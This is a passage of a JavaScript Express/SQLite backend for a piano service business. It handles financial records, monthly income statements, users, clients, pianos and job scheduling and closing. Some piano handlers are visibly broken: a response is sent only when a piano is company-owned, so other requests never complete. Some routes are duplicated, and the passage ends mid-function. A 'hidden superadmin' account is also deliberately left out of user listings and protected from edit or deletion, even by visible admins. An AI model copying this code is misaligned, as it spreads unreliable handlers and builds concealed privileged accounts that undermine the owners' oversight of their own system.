  if(!["ONE_TIME","MONTHLY"].includes(recurrence)) return res.status(400).json({error:"Invalid recurrence / Hibás ismétlődés"});
  if(Number.isNaN(amount) || amount<0) return res.status(400).json({error:"Amount must be a positive number / Az összeg nem lehet negatív"});
  db.prepare(`INSERT INTO financial_items(
    id,item_date,title,description,amount,main_type,category,recurrence,payment_method,balance_account,job_id,client_id,piano_id,source_type,source_id,created_by
  ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
    id,item_date,title,req.body.description||"",amount,main_type,req.body.category||"",recurrence,req.body.payment_method||"",req.body.balance_account||"",req.body.job_id||null,req.body.client_id||null,req.body.piano_id||null,req.body.source_type||null,req.body.source_id||null,req.user.name
  );
  res.json(db.prepare("SELECT * FROM financial_items WHERE id=?").get(id));
});

app.put("/api/financial-items/:id", auth, permit("ADMIN","MANAGER"), (req,res)=>{
  ensureRuntimeMigrations();
  const existing=db.prepare("SELECT * FROM financial_items WHERE id=?").get(req.params.id);
  if(!existing) return res.status(404).json({error:"Financial item not found / Pénzügyi tétel nem található"});
  const allowed=["item_date","title","description","amount","main_type","category","recurrence","payment_method","balance_account","job_id","client_id","piano_id","source_type","source_id"];
  const body={...req.body};
  if(body.amount!==undefined) body.amount=Number(body.amount||0);
  if(body.main_type!==undefined && !["INCOME","EXPENSE","ASSET","LIABILITY","EQUITY"].includes(body.main_type)) return res.status(400).json({error:"Invalid main type / Hibás fő típus"});
  if(body.recurrence!==undefined && !["ONE_TIME","MONTHLY"].includes(body.recurrence)) return res.status(400).json({error:"Invalid recurrence / Hibás ismétlődés"});
  const cols=allowed.filter(c=>body[c]!==undefined);
  if(cols.length) db.prepare(`UPDATE financial_items SET ${cols.map(c=>`${c}=?`).join(",")}, updated_at=CURRENT_TIMESTAMP WHERE id=?`).run(...cols.map(c=>body[c]),req.params.id);
  res.json(db.prepare("SELECT * FROM financial_items WHERE id=?").get(req.params.id));
});

app.delete("/api/financial-items/:id", auth, requireSuperadmin, (req,res)=>{
  ensureRuntimeMigrations();
  db.prepare("DELETE FROM financial_items WHERE id=?").run(req.params.id);
  res.json({ok:true});
});

function financialItemsForMonth(month){
  const monthStart = `${month}-01`;
  const nextMonth = new Date(`${monthStart}T00:00:00`);
  nextMonth.setMonth(nextMonth.getMonth()+1);
  const monthEnd = nextMonth.toISOString().slice(0,10);
  const rows=db.prepare(`
    SELECT * FROM financial_items
    WHERE (recurrence='MONTHLY' AND item_date < ?)
       OR (recurrence!='MONTHLY' AND item_date >= ? AND item_date < ?)
    ORDER BY item_date, created_at
  `).all(monthEnd,monthStart,monthEnd);
  return {monthStart,monthEnd,rows};
}

function incomeStatementPayload(month){
  ensureRuntimeMigrations();
  if(!/^\d{4}-\d{2}$/.test(month)) throw new Error("Month must be YYYY-MM");
  const {monthStart,monthEnd,rows}=financialItemsForMonth(month);
  const closedJobs=db.prepare(`SELECT * FROM jobs WHERE status='Completed' AND completed_at >= ? AND completed_at < ?`).all(monthStart,monthEnd);
  const openJobs=db.prepare("SELECT COUNT(*) c FROM jobs WHERE status!='Completed' OR status IS NULL").get().c;

  const incomeItems=rows.filter(x=>x.main_type==='INCOME');
  const expenseItems=rows.filter(x=>x.main_type==='EXPENSE');
  const passiveIncome=incomeItems.filter(x=>x.recurrence==='MONTHLY').reduce((s,x)=>s+Number(x.amount||0),0);
  const oneTimeIncome=incomeItems.filter(x=>x.recurrence!=='MONTHLY').reduce((s,x)=>s+Number(x.amount||0),0);
  const revenue=passiveIncome+oneTimeIncome;
  const recurringExpenses=expenseItems.filter(x=>x.recurrence==='MONTHLY').reduce((s,x)=>s+Number(x.amount||0),0);
  const oneTimeExpenses=expenseItems.filter(x=>x.recurrence!=='MONTHLY').reduce((s,x)=>s+Number(x.amount||0),0);
  const expenses=recurringExpenses+oneTimeExpenses;

  const accounts={};
  function account(code,name_en,name_hu,category){
    if(!accounts[code]) accounts[code]={code,name_en,name_hu,category,debit_total:0,credit_total:0,balance:0};
    return accounts[code];
  }
  const categoryNames={
    SERVICE_REVENUE:["Service Revenue","Szolgáltatási bevétel","REVENUE"],
    PIANO_SALE:["Piano Sale Revenue","Zongoraeladás bevétele","REVENUE"],
    PASSIVE_REVENUE:["Recurring Revenue","Ismétlődő bevétel","REVENUE"],
    OTHER_INCOME:["Other Income","Egyéb bevétel","REVENUE"],
    MATERIALS:["Materials Expense","Anyagköltség","EXPENSE"],
    CONTRACTOR:["Contractor Labor","Alvállalkozói munkadíj","EXPENSE"],
    TRANSPORT:["Transportation","Szállítás","EXPENSE"],
    RENT:["Rent","Bérleti díj","EXPENSE"],
    INSURANCE:["Insurance","Biztosítás","EXPENSE"],
    TAX:["Taxes","Adók","EXPENSE"],
    OTHER_EXPENSE:["Other Expense","Egyéb kiadás","EXPENSE"],
    CASH:["Cash","Készpénz","ASSET"],
    BANK:["Bank Account","Bankszámla","ASSET"],
    CHECKS:["Undeposited Checks","Befizetés előtti csekkek","ASSET"],
    AR:["Accounts Receivable","Vevőkövetelés","ASSET"],
    INVENTORY:["Inventory","Készlet","ASSET"],
    COMPANY_PIANOS:["Company Pianos","Céges zongorák","ASSET"],
    TOOLS:["Tools and Equipment","Szerszámok és berendezések","ASSET"],
    OTHER_ASSET:["Other Assets","Egyéb eszközök","ASSET"],
    LOAN:["Loans Payable","Hitelek","LIABILITY"],
    BANK_LOAN:["Bank Loan","Bankkölcsön","LIABILITY"],
    INSURANCE_LIABILITY:["Insurance Liabilities","Biztosítási kötelezettségek","LIABILITY"],
    OTHER_LONG_TERM_SOURCE:["Other Long-Term Sources","Egyéb hosszú lejáratú források","LIABILITY"],
    AP:["Accounts Payable","Szállítói tartozás","LIABILITY"],
    CHECK_PAYABLE:["Check Payables","Csekkes tartozás","LIABILITY"],
    RENT_PAYABLE:["Rent","Bérleti díj","LIABILITY"],
    UTILITIES_PAYABLE:["Utilities","Rezsi","LIABILITY"],
    SHORT_TERM_OPERATING:["Short-Term Operating Expenses","Rövid lejáratú működési kiadások","LIABILITY"],
    OTHER_SHORT_TERM_SOURCE:["Other Short-Term Sources","Egyéb rövid lejáratú források","LIABILITY"],
    OWNER_EQUITY:["Owner Equity","Saját tőke","EQUITY"],
    OTHER_SOURCE:["Other Sources","Egyéb forrás","EQUITY"]
  };
  const accountOrder={
    REVENUE:0,EXPENSE:100,ASSET:200,LIABILITY:300,EQUITY:400,
    SERVICE_REVENUE:1,PIANO_SALE:2,PASSIVE_REVENUE:3,OTHER_INCOME:20,
    TAX:101,MATERIALS:102,CONTRACTOR:103,TRANSPORT:104,RENT:105,INSURANCE:106,OTHER_EXPENSE:130,
    CASH:201,BANK:202,CHECKS:203,AR:204,INVENTORY:205,COMPANY_PIANOS:206,TOOLS:207,OTHER_ASSET:230,
    LOAN:301,BANK_LOAN:302,INSURANCE_LIABILITY:303,OTHER_LONG_TERM_SOURCE:304,AP:321,CHECK_PAYABLE:322,RENT_PAYABLE:323,UTILITIES_PAYABLE:324,SHORT_TERM_OPERATING:325,OTHER_SHORT_TERM_SOURCE:340,
    OWNER_EQUITY:401,OTHER_SOURCE:420
  };
  function addBalance(code, amount, preferredCategory){
    const n=categoryNames[code] || [code,code,preferredCategory||"ASSET"];
    const categoryOverride = preferredCategory && !categoryNames[code] ? preferredCategory : n[2];
    const a=account(code,n[0],n[1],categoryOverride);
    a.balance += Math.abs(Number(amount||0));
    if(Number(amount||0)>=0) a.debit_total += Math.abs(Number(amount||0)); else a.credit_total += Math.abs(Number(amount||0));
  }
  function expenseSourceAccount(item){
    const code=String(item.balance_account||"").trim();
    const meta=categoryNames[code];
    if(meta && (meta[2]==="LIABILITY" || meta[2]==="EQUITY")) return code;
    const cat=String(item.category||"").trim();
    if(cat==="RENT") return "RENT_PAYABLE";
    if(cat==="INSURANCE") return "INSURANCE_LIABILITY";
    if(cat==="TAX" || cat==="MATERIALS" || cat==="CONTRACTOR" || cat==="TRANSPORT") return "SHORT_TERM_OPERATING";
    return "OTHER_SHORT_TERM_SOURCE";
  }
  rows.forEach(x=>{
    const amount=Number(x.amount||0);
    if(x.main_type==='INCOME'){
      addBalance(x.category || (x.recurrence==='MONTHLY'?'PASSIVE_REVENUE':'SERVICE_REVENUE'), amount, 'REVENUE');
      if(x.balance_account) addBalance(x.balance_account, amount, 'ASSET');
    } else if(x.main_type==='EXPENSE'){
      addBalance(x.category || 'OTHER_EXPENSE', amount, 'EXPENSE');
      addBalance(expenseSourceAccount(x), amount, 'LIABILITY');
    } else if(x.main_type==='ASSET'){
      addBalance(x.category || x.balance_account || 'OTHER_ASSET', amount, 'ASSET');
    } else if(x.main_type==='LIABILITY'){
      addBalance(x.category || 'OTHER_SOURCE', amount, 'LIABILITY');
    } else if(x.main_type==='EQUITY'){
      addBalance(x.category || 'OWNER_EQUITY', amount, 'EQUITY');
    }
  });
  const trialBalance=Object.values(accounts).sort((a,b)=>(accountOrder[a.code]??999)-(accountOrder[b.code]??999));
  const assets=trialBalance.filter(a=>a.category==='ASSET').reduce((s,a)=>s+Number(a.balance||0),0);
  const liabilities=trialBalance.filter(a=>a.category==='LIABILITY').reduce((s,a)=>s+Number(a.balance||0),0);
  const equity=trialBalance.filter(a=>a.category==='EQUITY').reduce((s,a)=>s+Number(a.balance||0),0);
  const sources=liabilities+equity;
  return {
    month,monthStart,monthEndExclusive:monthEnd,generatedAt:new Date().toISOString(),
    accountingLogic:{source:"financial_items",generalLedger:"simple_internal_finance_register"},
    counts:{openJobs,closedJobs:closedJobs.length,financialItems:rows.length},
    totals:{passiveIncome,oneTimeIncome,revenue,recurringExpenses,oneTimeExpenses,expenses,profit:revenue-expenses,assets,liabilities,equity,sources,netWorth:assets-sources},
    trialBalance,
    items:rows
  };
}

app.get("/api/income-statement/monthly", auth, (req,res)=>{
  try{ res.json(incomeStatementPayload(req.query.month || today().slice(0,7))); }
  catch(e){ res.status(400).json({error:e.message}); }
});

app.get("/api/income-statement", auth, (req,res)=>{
  try{ res.json(incomeStatementPayload(today().slice(0,7))); }
  catch(e){ res.status(400).json({error:e.message}); }
});

app.get("/api/users", auth, permit("ADMIN","MANAGER"), (req,res)=> {
  // Hidden superadmin is never listed, not even to normal Alex/admin.
  res.json(db.prepare("SELECT id,name,email,role,status,created_at FROM users WHERE COALESCE(hidden_user,0)=0 ORDER BY role,name").all());
});
app.post("/api/users", auth, permit("ADMIN","MANAGER"), (req,res)=>{
  const {name,email,password,role}=req.body;
  if(!name || !email || !password || !role) return res.status(400).json({error:"Name, email, password and role are required"});
  if(req.user.role==="MANAGER" && role==="ADMIN") return res.status(403).json({error:"Managers cannot create admins"});
  if(role==="SUPERADMIN") return res.status(403).json({error:"Superadmin cannot be created from UI / Szuperadmin nem hozható létre a felületről"});
  const id=rid("U");
  const hash=bcrypt.hashSync(password,10);
  db.prepare("INSERT INTO users(id,name,email,password_hash,role,status,hidden_user,is_superadmin) VALUES(?,?,?,?,?,?,?,?)").run(id,name,email,hash,role,"Active",0,0);
  res.json({id,name,email,role,status:"Active"});
});
app.put("/api/users/:id", auth, requireSuperadmin, (req,res)=>{
  const target=db.prepare("SELECT * FROM users WHERE id=?").get(req.params.id);
  if(!target) return res.status(404).json({error:"User not found"});
  if(Number(target.hidden_user||0)===1) return res.status(403).json({error:"Hidden system owner cannot be edited from list"});
  const allowed=["name","email","role","status"];
  const cols=allowed.filter(c=>req.body[c]!==undefined);
  if(req.body.role==="SUPERADMIN") return res.status(403).json({error:"Cannot promote visible user to hidden superadmin from UI"});
  if(req.body.password){ cols.push("password_hash"); req.body.password_hash=bcrypt.hashSync(req.body.password,10); }
  if(cols.length) db.prepare(`UPDATE users SET ${cols.map(c=>`${c}=?`).join(",")}, updated_at=CURRENT_TIMESTAMP WHERE id=?`).run(...cols.map(c=>req.body[c]),req.params.id);
  res.json(db.prepare("SELECT id,name,email,role,status FROM users WHERE id=?").get(req.params.id));
});
app.delete("/api/users/:id", auth, requireSuperadmin, (req,res)=>{
  const target=db.prepare("SELECT * FROM users WHERE id=?").get(req.params.id);
  if(!target) return res.status(404).json({error:"User not found"});
  if(Number(target.hidden_user||0)===1) return res.status(403).json({error:"Hidden system owner cannot be deleted"});
  db.prepare("DELETE FROM users WHERE id=?").run(req.params.id);
  res.json({ok:true});
});

function createResourceRoutes(key, table, prefix, write, roles){
  app.get(`/api/${key}`, auth, (req,res)=>res.json(db.prepare(`SELECT * FROM ${table} ORDER BY created_at DESC`).all()));
  app.post(`/api/${key}`, auth, permit(...roles), (req,res)=>{
    const id=req.body.id || rid(prefix);
    const cols=["id",...write].filter(c=>c==="id" || req.body[c]!==undefined);
    db.prepare(`INSERT INTO ${table}(${cols.join(",")}) VALUES(${cols.map(()=>"?").join(",")})`).run(...cols.map(c=>c==="id"?id:req.body[c]));
    res.json(db.prepare(`SELECT * FROM ${table} WHERE id=?`).get(id));
  });
  app.put(`/api/${key}/:id`, auth, permit(...roles), (req,res)=>{
    const cols=write.filter(c=>req.body[c]!==undefined);
    if(cols.length) db.prepare(`UPDATE ${table} SET ${cols.map(c=>`${c}=?`).join(",")}, updated_at=CURRENT_TIMESTAMP WHERE id=?`).run(...cols.map(c=>req.body[c]), req.params.id);
    res.json(db.prepare(`SELECT * FROM ${table} WHERE id=?`).get(req.params.id));
  });
  app.delete(`/api/${key}/:id`, auth, requireSuperadmin, (req,res)=>{
    db.prepare(`DELETE FROM ${table} WHERE id=?`).run(req.params.id);
    res.json({ok:true});
  });
}
createResourceRoutes("contacts","contacts","C",["name","company","type","email","phone","address","priority","status","owner","relationship_holder","loss_risk","last_contact","next_step","notes"],["ADMIN","MANAGER","WORKER"]);

app.get("/api/pianos", auth, (req,res)=>{
  ensureRuntimeMigrations();
  const rows=db.prepare(`
    SELECT p.*,
           c.name AS owner_name,
           c.name AS client_name,
           c.address AS owner_address
    FROM pianos p
    LEFT JOIN contacts c ON c.id = p.owner_contact_id
    ORDER BY p.display_name, p.brand, p.model
  `).all();
  res.json(rows);
});

app.post("/api/pianos", auth, permit("ADMIN","MANAGER","WORKER"), (req,res)=>{
  ensureRuntimeMigrations();
  const id=req.body.id || rid("P");
  const brand=req.body.brand || "";
  const model=req.body.model || "";
  const display=req.body.display_name || `${brand} ${model}`.trim() || req.body.piano_name || "Unknown piano";
  const ownershipType=req.body.ownership_type || req.body.ownership || "Customer owned";
  const estimated=Number(req.body.estimated_value||0);
  db.prepare(`INSERT INTO pianos(id,brand,model,serial_no,ownership,ownership_type,display_name,owner_contact_id,location,estimated_value,status,notes)
              VALUES(?,?,?,?,?,?,?,?,?,?,?,?)`)
    .run(id,brand,model,req.body.serial_no||"",ownershipType,ownershipType,display,req.body.owner_contact_id||null,req.body.location||"",estimated,"Active",req.body.notes||"");
  const piano=db.prepare("SELECT * FROM pianos WHERE id=?").get(id);
  if(String(ownershipType).toLowerCase().includes("company"))
res.json(db.prepare("SELECT * FROM pianos WHERE id=?").get(id));
});

app.put("/api/pianos/:id", auth, permit("ADMIN","MANAGER","WORKER"), (req,res)=>{
  ensureRuntimeMigrations();
  const allowed=["brand","model","serial_no","ownership","ownership_type","display_name","owner_contact_id","location","estimated_value","status","notes"];
  const cols=allowed.filter(c=>req.body[c]!==undefined);
  if(cols.length) db.prepare(`UPDATE pianos SET ${cols.map(c=>`${c}=?`).join(",")}, updated_at=CURRENT_TIMESTAMP WHERE id=?`).run(...cols.map(c=>req.body[c]), req.params.id);
  const piano=db.prepare("SELECT * FROM pianos WHERE id=?").get(req.params.id);
  if(piano && String(piano.ownership_type||piano.ownership||"").toLowerCase().includes("company"))
res.json(piano);
});


app.delete("/api/pianos/:id", auth, requireSuperadmin, (req,res)=>{
  db.prepare("DELETE FROM pianos WHERE id=?").run(req.params.id);
  res.json({ok:true});
});

createResourceRoutes("knowledge_base","knowledge_base","KB",["job_id","title","category","content_type","body","stored_path","owner","amount","payment_method","invoice_number","priority"],["ADMIN","MANAGER","WORKER"]);

app.get("/api/client-profile/:id", auth, (req,res)=>{
  const client=db.prepare("SELECT * FROM contacts WHERE id=?").get(req.params.id);
  if(!client) return res.status(404).json({error:"Client not found"});
  const pianos=db.prepare("SELECT * FROM pianos WHERE owner_contact_id=? ORDER BY created_at DESC").all(req.params.id);
  const jobs=db.prepare("SELECT * FROM jobs WHERE client_id=? OR client_name=? ORDER BY start_time DESC LIMIT 50").all(req.params.id, client.name);
  res.json({client,pianos,jobs,lastVisit:jobs[0]?.start_time || client.last_contact || "",lastJob:jobs[0]?.title || ""});
});

app.get("/api/jobs", auth, (req,res)=>{
  ensureRuntimeMigrations();
  res.json(db.prepare("SELECT * FROM jobs ORDER BY start_time").all());
});
app.post("/api/jobs", auth, permit("ADMIN","MANAGER","WORKER"), (req,res)=>{
  const required=["title","assigned_to","start_time","end_time"];
  for(const r of required) if(!req.body[r]) return res.status(400).json({error:`${r} is required`});
  const id=req.body.id || rid("J");
  const cols=["id","job_key","parent_job_id","title","job_type","client_id","client_name","client_phone","piano_id","piano_name","assigned_to","created_by","priority","status","start_time","end_time","timezone","planned_amount","pricing_basis","planned_hours","travel_minutes","service_address","instructions","planned_job_id"]
    .filter(c=>c==="id" || c==="created_by" || req.body[c]!==undefined);
  db.prepare(`INSERT INTO jobs(${cols.join(",")}) VALUES(${cols.map(()=>"?").join(",")})`).run(...cols.map(c=>c==="id"?id:(c==="job_key"?(req.body.job_key||stableJobKey()):(c==="created_by"?req.user.name:req.body[c]))));
  res.json(db.prepare("SELECT * FROM jobs WHERE id=?").get(id));
});
app.put("/api/jobs/:id", auth, (req,res)=>{
  const jobId = req.params.id || req.body.id || req.body.job_id || req.body.job_key;
  const job=getJobByAnyId(jobId, req.body);
  if(!job) return res.status(404).json({error:`Job not found. id/job_key: ${String(jobId||"").trim()}`});

  // Operational scheduling rule:
  // everyone may change the responsible person and operational details.
  // Operatív szabály: mindenki átadhatja / visszaveheti / továbbadhatja a munkát.
  const allowed=[
    "title","job_type","client_id","client_name","client_phone",
    "piano_id","piano_name","assigned_to","priority","status",
    "start_time","end_time","planned_amount","pricing_basis",
    "planned_hours","travel_minutes","service_address","instructions"
  ];

  if(req.body.job_type==="Part-work" && (!req.body.instructions || !String(req.body.instructions).trim())){
    return res.status(400).json({error:"Remaining tasks are required for part-work / Részmunka esetén a hátralévő feladatok megadása kötelező"});
  }

  const cols=allowed.filter(c=>req.body[c]!==undefined);
  if(cols.length){
    const setParts=cols.map(c=>`${c}=?`);
    const vals=cols.map(c=>req.body[c]);

    if(req.body.assigned_to!==undefined && req.body.assigned_to!==job.assigned_to){
      setParts.push("last_reassigned_by=?");
      setParts.push("reassignment_note=?");
      vals.push(req.user.name, req.body.reassignment_note || "Changed in edit / Szerkesztésben módosítva");
    }

    setParts.push("updated_at=CURRENT_TIMESTAMP");
    vals.push(job.id);
    db.prepare(`UPDATE jobs SET ${setParts.join(",")} WHERE id=?`).run(...vals);
  }

  res.json(db.prepare("SELECT * FROM jobs WHERE id=?").get(job.id));
});

app.put("/api/jobs/:id/reassign", auth, (req,res)=>{
  const jobId = req.params.id || req.body.id || req.body.job_id;
  const job=getJobByAnyId(jobId, req.body);
  if(!job) return res.status(404).json({error:`Job not found: ${String(jobId||"").trim()}`});

  const assignedTo=req.body.assigned_to;
  if(!assignedTo) return res.status(400).json({error:"assigned_to is required"});

  const isTakingBackToSelf = assignedTo === req.user.name;
  if(!canReassignJob(req.user, job) && !isTakingBackToSelf) {
    return res.status(403).json({error:"You cannot reassign this job"});
  }

  db.prepare("UPDATE jobs SET assigned_to=?, last_reassigned_by=?, reassignment_note=?, updated_at=CURRENT_TIMESTAMP WHERE id=?")
    .run(assignedTo, req.user.name, req.body.reassignment_note||"", job.id);

  res.json(db.prepare("SELECT * FROM jobs WHERE id=?").get(job.id));
});

app.delete("/api/jobs/:id", auth, requireSuperadmin, (req,res)=>{
  const job=getJobByAnyId(req.params.id, req.body||{});
  if(!job) return res.status(404).json({error:"Job not found"});
  const logs=db.prepare("SELECT id FROM job_logs WHERE job_id=?").all(job.id);
  db.prepare("DELETE FROM financial_items WHERE job_id=? OR (source_type='closed_job' AND source_id=?)").run(job.id, job.id);
  db.prepare("DELETE FROM knowledge_base WHERE job_id=?").run(job.id);
  db.prepare("DELETE FROM job_logs WHERE job_id=?").run(job.id);
  db.prepare("DELETE FROM jobs WHERE parent_job_id=?").run(job.id);
  db.prepare("DELETE FROM jobs WHERE id=?").run(job.id);
  res.json({ok:true,deleted_job_id:job.id,deleted_logs:logs.length});
});

app.post("/api/jobs/:id/close", auth, upload.single("file"), (req,res)=>{
  const jobId = req.params.id || req.body.id || req.body.job_id || req.body.job_key;
  const job=getJobByAnyId(jobId, req.body);
  if(!job) return res.status(404).json({error:`Job not found. id/job_key: ${String(jobId||"").trim()}`});

  if(!(req.user.role==="ADMIN" || job.assigned_to===req.user.name)){
    return res.status(403).json({
      error:`You cannot close this job because it is currently assigned to ${job.assigned_to}. Take it back to yourself in Edit Job first. / Nem zárhatod le ezt a munkát, mert jelenleg ${job.assigned_to} a felelős. Előbb vedd vissza magadra a Munka szerkesztése ablakban.`
    });
  }

  const closeType=req.body.close_type;
  if(!["Partial","Full","Failed"].includes(closeType)) return res.status(400).json({error:"Close type must be Partial, Full or Failed"});

  const billed=Number(req.body.billed_amount);
  if(Number.isNaN(billed)) return res.status(400).json({error:"Billed amount is required. Use 0 if not billable."});

  const desc=(req.body.close_description||"").trim();
  if(!desc) return res.status(400).json({error:"Close description is required"});

  const payment=req.body.payment_method || "";
  if(billed > 0 && !payment) return res.status(400).json({error:"Payment method is required when billed amount is greater than zero / Fizetési mód kötelező, ha az összeg nagyobb mint 0"});

  if(billed > 0 && !req.file) return res.status(400).json({error:"Invoice/check file is required when billed amount is greater than zero"});
  const storedPath=req.file ? "/uploads/"+path.basename(req.file.path) : null;

  let nextJobId=null;
  if(closeType==="Partial"){
    const required=["next_title","next_assigned_to","next_start_time","next_end_time"];
    for(const r of required) if(!req.body[r]) return res.status(400).json({error:`${r} is required for partial close`});

    nextJobId=rid("J");
    db.prepare(`INSERT INTO jobs(
      id,job_key,parent_job_id,title,job_type,client_id,client_name,client_phone,piano_id,piano_name,
      assigned_to,created_by,priority,status,start_time,end_time,timezone,planned_amount,pricing_basis,
      planned_hours,travel_minutes,service_address,instructions
    ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`)
      .run(
        nextJobId,stableJobKey(),job.id,req.body.next_title,"Part-work",
        job.client_id,job.client_name,job.client_phone,job.piano_id,job.piano_name,
        req.body.next_assigned_to,req.user.name,req.body.next_priority||job.priority,"Open",
        req.body.next_start_time,req.body.next_end_time,"America/New_York",
        Number(req.body.next_planned_amount||0),req.body.next_pricing_basis||"",
        Number(req.body.next_planned_hours||0),Number(req.body.next_travel_minutes||0),
        req.body.next_service_address||job.service_address,req.body.next_instructions||""
      );
  }

  db.prepare(`UPDATE jobs SET status=?, close_type=?, billed_amount=?, payment_method=?, invoice_status=?, invoice_number=?, close_notes=?, completed_at=?, updated_at=CURRENT_TIMESTAMP WHERE id=?`)
    .run(closeType==="Full"?"Completed":(closeType==="Failed"?"Failed":"Partially completed"),closeType,billed,payment,billed>0?(req.body.invoice_status||"Invoiced"):"Not billable",req.body.invoice_number||"",desc,nowISO(),job.id);

  const logId=rid("LOG");
  db.prepare(`INSERT INTO job_logs(id,job_id,log_type,description,billed_amount,payment_method,invoice_number,document_path,next_job_id,created_by) VALUES(?,?,?,?,?,?,?,?,?,?)`)
    .run(logId,job.id,closeType,desc,billed,payment,req.body.invoice_number||"",storedPath,nextJobId,req.user.name);

  db.prepare(`INSERT INTO knowledge_base(id,job_id,title,category,content_type,body,stored_path,owner,amount,payment_method,invoice_number,priority) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)`)
    .run(rid("KB"),job.id,`${closeType} close / ${closeType==="Full"?"Teljes lezárás":(closeType==="Failed"?"Sikertelen lezárás":"Részlezárás")}: ${job.title}`,closeType==="Full"?"Closed Job":(closeType==="Failed"?"Failed Job":"Partial Close"),"Job Record",desc,storedPath,req.user.name,billed,payment,req.body.invoice_number||"",job.priority);

  const financialItem=createFinancialItemForClosedJob(job,logId,billed,payment,req.user.name);
  res.json({ok:true,next_job_id:nextJobId,storedPath,financial_item_id:financialItem?.id||null});
});


app.get("/api/contacts/:id/pianos", auth, (req,res)=>{
  res.json(db.prepare("SELECT * FROM pianos WHERE owner_contact_id=? ORDER BY display_name, brand, model").all(req.params.id));
});

app.post("/api/contacts/:id/pianos", auth, permit("ADMIN","MANAGER","WORKER"), (req,res)=>{
  ensureRuntimeMigrations();
  const client=db.prepare("SELECT * FROM contacts WHERE id=?").get(req.params.id);
  if(!client) return res.status(404).json({error:"Client not found"});
  const id=req.body.id || rid("P");
  const brand=req.body.brand || "";
  const model=req.body.model || "";
  const display=req.body.display_name || `${brand} ${model}`.trim() || req.body.piano_name || "Unknown piano";
  const ownershipType=req.body.ownership_type || "Customer owned";
  const estimated=Number(req.body.estimated_value||0);
  db.prepare(`INSERT INTO pianos(id,brand,model,serial_no,ownership,ownership_type,display_name,owner_contact_id,location,estimated_value,status,notes)
              VALUES(?,?,?,?,?,?,?,?,?,?,?,?)`)
    .run(id,brand,model,req.body.serial_no||"",ownershipType,ownershipType,display,client.id,req.body.location||client.address||"",estimated,"Active",req.body.notes||"");
  const piano=db.prepare("SELECT * FROM pianos WHERE id=?").get(id);
  if(String(ownershipType).toLowerCase().includes("company"))
res.json(piano);
});


app.get("/api/contacts/:id/pianos", auth, (req,res)=>{res.json(db.prepare("SELECT * FROM pianos WHERE owner_contact_id=? ORDER BY display_name, brand, model").all(req.params.id));});
app.put("/api/contacts/:id/pianos", auth, permit("ADMIN","MANAGER","WORKER"), (req,res)=>{
  const ids = Array.isArray(req.body.piano_ids) ? req.body.piano_ids : [];
  db.prepare("UPDATE pianos SET owner_contact_id=NULL WHERE owner_contact_id=?").run(req.params.id);
  const upd=db.prepare("UPDATE pianos SET owner_contact_id=? WHERE id=?"); ids.forEach(id=>upd.run(req.params.id,id));
  res.json({ok:true,piano_ids:ids});
});
app.post("/api/contacts/:id/pianos", auth, permit("ADMIN","MANAGER","WORKER"), (req,res)=>{
  const client=db.prepare("SELECT * FROM contacts WHERE id=?").get(req.params.id);
  if(!client) return res.status(404).json({error:"Client not found"});
  const id=req.body.id || rid("P"), brand=req.body.brand || "", model=req.body.model || "", display=req.body.display_name || `${brand} ${model}`.trim() || "Unknown piano";
  const ownershipType=req.body.ownership_type || "Customer owned", estimated=Number(req.body.estimated_value||0);
  db.prepare(`INSERT INTO pianos(id,brand,model,serial_no,ownership,ownership_type,display_name,owner_contact_id,location,estimated_value,status,notes) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)`).run(id,brand,model,req.body.serial_no||"",ownershipType,ownershipType,display,client.id,req.body.location||client.address||"",estimated,"Active","");
  const piano=db.prepare("SELECT * FROM pianos WHERE id=?").get(id);
  if(String(ownershipType).toLowerCase().includes("company") && typeof createPianoAssetEntry==="function")
res.json(piano);
});
app.get("/api/closed-jobs", auth, (req,res)=>{
  const rows=db.prepare(`
    SELECT
      jl.id AS log_id,
      jl.job_id,
      j.job_key,
      j.title,
      j.job_type,
      j.client_name,
      j.client_phone,
      j.piano_name,
      j.assigned_to AS responsible_at_close,
      jl.created_by AS closed_by,
      jl.created_at AS closed_at,
      jl.log_type AS close_type,
      jl.description AS close_description,
      jl.billed_amount,
      jl.payment_method,
      jl.invoice_number,
      jl.document_path,
      jl.next_job_id,
      nj.job_key AS next_job_key,
      nj.title AS next_job_title
    FROM job_logs jl
    LEFT JOIN jobs j ON j.id=jl.job_id
    LEFT JOIN jobs nj ON nj.id=jl.next_job_id
    WHERE jl.log_type IN ('Full','Partial','Failed')
    ORDER BY jl.created_at DESC
  `).all();
  res.json(rows);
});

















app.delete("/api/closed-jobs/:id", auth, requireSuperadmin, (req,res)=>{
  const log=db.prepare("SELECT * FROM job_logs WHERE id=?").get(req.params.id);
  if(!log) return res.status(404).json({error:"Closed job log not found"});
  db.prepare("DELETE FROM financial_items WHERE job_id=? OR (source_type='closed_job' AND source_id=?)").run(log.job_id, log.job_id);
  db.prepare("DELETE FROM knowledge_base WHERE job_id=?").run(log.job_id);
  db.prepare("DELETE FROM job_logs WHERE id=?").run(log.id);
  const job=db.prepare("SELECT * FROM jobs WHERE id=?").get(log.job_id);
  if(job && ["Completed","Partially completed"].includes(String(job.status||""))){
    db.prepare("DELETE FROM jobs WHERE id=?").run(log.job_id);
  }
  res.json({ok:true});
});

app.get("/api/inventory-checks", auth, permit("ADMIN","MANAGER","WORKER"), (req,res)=>{
  res.json(db.prepare("SELECT * FROM inventory_checks ORDER BY check_date DESC, created_at DESC").all());
});
app.delete("/api/inventory-checks/:id", auth, requireSuperadmin, (req,res)=>{
  db.prepare("DELETE FROM inventory_checks WHERE id=?").run(req.params.id);
  res.json({ok:true});
});


app.post("/api/system/delete-everything", auth, requireSuperadmin, (req,res)=>{
  const confirmation=String(req.body?.confirmation||"");
  if(confirmation!=="DELETE EVERYTHING") return res.status(400).json({error:"Exact confirmation is required"});
  const exists=(table)=>!!db.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name=?").get(table);
  const clear=(table, where="")=>{ if(exists(table)) db.prepare(`DELETE FROM ${table} ${where}`).run(); };
  const tx=db.transaction(()=>{
    [
      "financial_items",
      "job_logs",
      "knowledge_base",
      "jobs",
      "planned_jobs",
      "inventory_checks",
      "inventory_items",
      "pianos",
      "contacts"
    ].forEach(t=>clear(t));
    if(exists("users")){
      db.prepare("DELETE FROM users WHERE COALESCE(hidden_user,0)=0 AND COALESCE(is_superadmin,0)=0").run();
